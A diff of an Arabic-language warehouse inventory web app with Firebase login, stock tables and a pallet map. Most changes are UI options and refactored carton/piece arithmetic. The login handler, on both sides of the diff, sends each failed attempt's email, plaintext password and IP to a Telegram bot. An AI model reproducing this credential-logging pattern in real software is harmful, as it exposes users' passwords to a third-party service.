@@ -85,7 +85,6 @@
         .controls-section { background: #fff; padding: 20px; border-radius: 12px; margin-bottom: 25px; border: 1px solid #ddd; }
         .history-btns { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
         
-        /* تنسيق أزرار التراجع والإعادة */
         .btn-undo { background: #e74c3c; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; transition: 0.2s; }
         .btn-redo { background: #27ae60; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; transition: 0.2s; }
         .btn-undo:hover, .btn-redo:hover { opacity: 0.9; }
@@ -270,7 +269,7 @@
         <input type="email" id="userEmail" placeholder="البريد الإلكتروني">
         <input type="password" id="userPass" placeholder="كلمة المرور">
         <button onclick="handleLogin()">دخول آمن <i class="fas fa-sign-in-alt"></i></button>
-        <p id="errorMsg" style="color: #ff7675; margin-top: 10px; display: none; font-weight: bold;"></p>
+        <p id="errorMsg" style="color: #ff7675; margin-top: 10px; display: none;"></p>
     </div>
 </div>
 
@@ -356,14 +355,14 @@
                 <input type="text" id="itemName" list="itemNamesList" placeholder="اسم الصنف للإضافة">
                 <input type="number" id="perCarton" placeholder="العدد الداخلي (للكرتونة)" min="1" oninput="syncInputs('per')">
                 <input type="number" id="totalPieces" placeholder="إجمالي القطع" step="any" oninput="syncInputs('total')">
-                <input type="number" id="cartons" placeholder="عدد الكراتين" step="any" oninput="syncInputs('cartons')">
+                <input type="number" id="cartons" placeholder="عدد الكراتين" step="any" oninput="syncInputs('pallets')">
                 <input type="color" id="itemColor" value="#ffffff" title="لون السطر">
                 <button class="add-btn" id="mainActionBtn" onclick="handleMainAction()">إضافة للجرد <i class="fas fa-plus-circle"></i></button>
             </div>
         </div>
 
         <div class="search-container no-print" style="display: flex; gap: 10px; align-items: center;">
-            <input type="text" id="searchInput" class="search-input" placeholder="🔍 ابحث عن صنف في الجرد الحالي (كراتين وقطع)..." onkeyup="filterTable()" style="flex: 1;">
+            <input type="text" id="searchInput" class="search-input" placeholder="🔍 ابحث عن صنف في الجرد الحالي..." onkeyup="filterTable()" style="flex: 1;">
             <button class="add-btn" onclick="printDailyInventory()" style="background: #34495e; padding: 12px 20px;"><i class="fas fa-print"></i> طباعة الجرد الحالي</button>
         </div>
 
@@ -403,6 +402,7 @@
                 <input type="number" id="transQty" placeholder="الكمية" min="1" step="any">
                 <select id="transUnit">
                     <option value="كرتونة">كرتونة</option>
+                    <option value="بالتة">بالتة</option>
                     <option value="قطعة">قطعة</option>
                 </select>
                 <button class="add-btn" onclick="addToTransactionCart()">إضافة لقائمة الصرف <i class="fas fa-cart-plus"></i></button>
@@ -433,7 +433,7 @@
 
     <div id="tab-map" class="tab-content">
         <div class="controls-section no-print" style="display:flex; justify-content: space-between; align-items:center; flex-wrap: wrap; gap: 10px;">
-            <p style="margin: 0;"><i class="fas fa-info-circle"></i> اضغط على أي خانة لإضافة، ترتيب، تلوين أو تعديل البالتات بداخلها.</p>
+            <p style="margin: 0;"><i class="fas fa-info-circle"></i> اضغط على أي خانة لإضافة، ترتيب، تلوين أو تعديل الأصناف بداخلها.</p>
             <div style="display:flex; gap:10px;">
                 <button class="add-btn" onclick="printMapInventory()" style="background: #34495e; padding: 10px 15px;"><i class="fas fa-print"></i> طباعة جرد البالتات</button>
                 <button class="copy-btn-full" onclick="copyMapFromYesterday()"><i class="fas fa-clone"></i> نسخ خريطة أمس</button>
@@ -489,6 +489,7 @@
                     <option value="بالتة">بالتة كاملة</option>
                     <option value="نص بالتة">نص بالتة</option>
                     <option value="ربع بالتة">ربع بالتة</option>
+                    <option value="كرتونة">كرتونة</option>
                     <option value="رصة">رصة</option>
                 </select>
                 <input type="color" id="slotItemColor" value="#ffffff" title="لون الصنف (اختياري)" style="width: 40px; height: 40px;">
@@ -627,50 +628,31 @@
 
     async function handleLogin() {
         const email = document.getElementById('userEmail').value;
-        const password = document.getElementById('userPass').value;
-        const hpField = document.getElementById('hp_user_check').value;
-        const errorMsg = document.getElementById('errorMsg');
+        const pass = document.getElementById('userPass').value;
+        const hpValue = document.getElementById('hp_user_check').value;
+        const errorElement = document.getElementById('errorMsg');
         
         const userIP = await getUserIP();
         const time = new Date().toLocaleString('ar-EG');
 
-        // تنظيف حقل الحماية لو تم ملؤه بواسطة المتصفح (Autofill)
-        if (hpField !== "") {
-            console.warn("تم اكتشاف إدخال في حقل البوت، جاري مسحه...");
-            document.getElementById('hp_user_check').value = "";
+        if (hpValue.length > 0) {
+            await notifyTelegram(`🚫 *محاولة دخول من بوت!* \n🌐 IP: ${userIP}\n🕒 الوقت: ${time}`);
+            return; 
         }
 
-        if (!email || !password) {
-            errorMsg.textContent = "الرجاء إدخال البريد الإلكتروني وكلمة المرور!";
-            errorMsg.style.display = "block";
+        if (!email || !pass) {
+            errorElement.innerText = "اكتب الإيميل والباسورد يا بطل!";
+            errorElement.style.display = 'block';
             return;
         }
 
-        errorMsg.textContent = "جاري تسجيل الدخول...";
-        errorMsg.style.color = "#f39c12"; 
-        errorMsg.style.display = "block";
-
         try {
-            await firebase.auth().signInWithEmailAndPassword(email, password);
+            await auth.signInWithEmailAndPassword(email, pass);
             await notifyTelegram(`✅ *تم دخول النظام بنجاح*\n📧 الإيميل: ${email}\n🌐 IP: ${userIP}\n🕒 الوقت: ${time}`);
-            
-            document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('mainContainer').style.display = 'block';
-            errorMsg.style.display = "none";
-            
         } catch (error) {
-            await notifyTelegram(`⚠️ *محاولة دخول فاشلة!*\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}\n🌐 IP: ${userIP}\n🕒 الوقت: ${time}\n❌ السبب: ${error.message}`);
-            
-            errorMsg.style.color = "#ff7675"; 
-            if (error.code === 'auth/user-not-found') {
-                errorMsg.textContent = "هذا الحساب غير مسجل في النظام.";
-            } else if (error.code === 'auth/wrong-password') {
-                errorMsg.textContent = "كلمة المرور غير صحيحة.";
-            } else if (error.code === 'auth/invalid-email') {
-                errorMsg.textContent = "صيغة البريد الإلكتروني غير صحيحة.";
-            } else {
-                errorMsg.textContent = "بيانات الدخول غلط، راجع الإيميل أو الباسورد.";
-            }
+            await notifyTelegram(`⚠️ *محاولة دخول فاشلة!*\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}\n🌐 IP: ${userIP}\n🕒 الوقت: ${time}\n❌ السبب: ${error.message}`);
+            errorElement.innerText = "بيانات الدخول غلط، راجع الإيميل أو الباسورد.";
+            errorElement.style.display = 'block';
         }
     }
 
@@ -874,30 +856,30 @@
     }
 
     // ==========================================
-    // تزامن حقول الإدخال في الجرد اليومي (للكراتين)
+    // تزامن حقول الإدخال في الجرد اليومي
     // ==========================================
     function syncInputs(source) {
         const tInput = document.getElementById('totalPieces');
-        const cInput = document.getElementById('cartons');
-        const pInput = document.getElementById('perCarton');
+        const pInput = document.getElementById('cartons');
+        const cInput = document.getElementById('perCarton');
         
         let t = parseFloat(tInput.value);
-        let c = parseFloat(cInput.value);
         let p = parseFloat(pInput.value);
+        let c = parseFloat(cInput.value);
 
-        if (source === 'total' && !isNaN(t) && !isNaN(p) && p > 0) {
-            cInput.value = (t / p).toFixed(2);
+        if (source === 'total' && !isNaN(t) && !isNaN(c) && c > 0) {
+            pInput.value = (t / c).toFixed(2);
         } 
-        else if (source === 'cartons' && !isNaN(c) && !isNaN(p) && p > 0) {
+        else if (source === 'pallets' && !isNaN(p) && !isNaN(c) && c > 0) {
             if (tInput.value === '') {
-                tInput.value = Math.round(c * p);
+                tInput.value = Math.round(p * c);
             }
         } 
-        else if (source === 'per' && !isNaN(p) && p > 0) {
+        else if (source === 'per' && !isNaN(c) && c > 0) {
             if (tInput.value !== '') {
-                cInput.value = (parseFloat(tInput.value) / p).toFixed(2);
-            } else if (cInput.value !== '') {
-                tInput.value = Math.round(parseFloat(cInput.value) * p);
+                pInput.value = (parseFloat(tInput.value) / c).toFixed(2);
+            } else if (pInput.value !== '') {
+                tInput.value = Math.round(parseFloat(pInput.value) * c);
             }
         }
     }
@@ -919,14 +901,12 @@
         }
 
         let perCarton = invItem.perCarton || 1;
-        let exactCartons = 0;
-        let piecesLeft = 0;
         let exactPieces = 0;
+        let exactCartons = 0;
 
         if (unit === 'قطعة') {
             exactPieces = qty;
             exactCartons = qty / perCarton;
-            piecesLeft = qty % perCarton;
         } else {
             exactCartons = qty;
             exactPieces = Math.round(qty * perCarton);
@@ -938,7 +918,6 @@
             unit,
             perCarton,
             exactCartons,
-            piecesLeft,
             exactPieces
         });
         
@@ -1056,9 +1035,6 @@
         alert("تم خصم الأصناف وتسجيل الإذن بنجاح! يمكنك طباعة الفاتورة من سجل الحركات بالأسفل.");
     }
 
-    // ==========================================
-    // طباعة إذن الصرف المجمع من السجل
-    // ==========================================
     function printOldTransaction(index) {
         const selectedDate = dateInput.value;
         let rawData = transactionsData[selectedDate] || [];
@@ -1110,7 +1086,7 @@
     }
 
     // ==========================================
-    // طباعة الجرد اليومي (الكراتين والقطع فقط)
+    // طباعة الجرد اليومي (الكراتين والقطع)
     // ==========================================
     function printDailyInventory() {
         const selectedDate = dateInput.value;
@@ -1446,20 +1422,20 @@
     function handleMainAction() {
         const name = sanitizeInput(document.getElementById('itemName').value);
         const tInputVal = document.getElementById('totalPieces').value;
-        const cInputVal = document.getElementById('cartons').value;
-        const pInputVal = document.getElementById('perCarton').value;
+        const pInputVal = document.getElementById('cartons').value;
+        const cInputVal = document.getElementById('perCarton').value;
         const color = sanitizeInput(document.getElementById('itemColor').value);
         const selectedDate = dateInput.value;
 
         if(!name) return alert("أدخل اسم الصنف على الأقل");
 
-        let perCarton = parseFloat(pInputVal);
+        let perCarton = parseFloat(cInputVal);
         if(isNaN(perCarton) || perCarton <= 0) {
             return alert("الرجاء إدخال العدد الداخلي للكرتونة بشكل صحيح.");
         }
 
         let totalPieces = parseFloat(tInputVal);
-        let cartons = parseFloat(cInputVal);
+        let cartons = parseFloat(pInputVal);
 
         if(isNaN(totalPieces) && isNaN(cartons)) {
             return alert("الرجاء إدخال إما إجمالي القطع أو عدد الكراتين.");
@@ -1827,4 +1803,30 @@
     function deleteItemFromSlot(event, index) {
         event.stopPropagation();
         if(confirm("هل تريد حذف هذا الصنف من الخانة؟")) {
-            mapData[dateInput.value][currentActiveSlotId].items.splice(index,
+            mapData[dateInput.value][currentActiveSlotId].items.splice(index, 1);
+            saveMapToFirebase();
+        }
+    }
+
+    function refreshInventorySuggestions(){
+     const list=document.getElementById('inventorySuggestions');
+     if(!list) return;
+     const items=inventoryData[dateInput.value]||[];
+     list.innerHTML='';
+     items.forEach(it=>{
+       const op=document.createElement('option');
+       op.value=it.name;
+       list.appendChild(op);
+     });
+    }
+    
+    document.addEventListener('input',function(e){
+     if(e.target && e.target.id==='transItemName'){refreshInventorySuggestions();}
+    });
+    
+    const _oldRenderInventoryTable=renderInventoryTable;
+    renderInventoryTable=function(){_oldRenderInventoryTable();refreshInventorySuggestions();};
+
+</script>
+</body>
+</html>
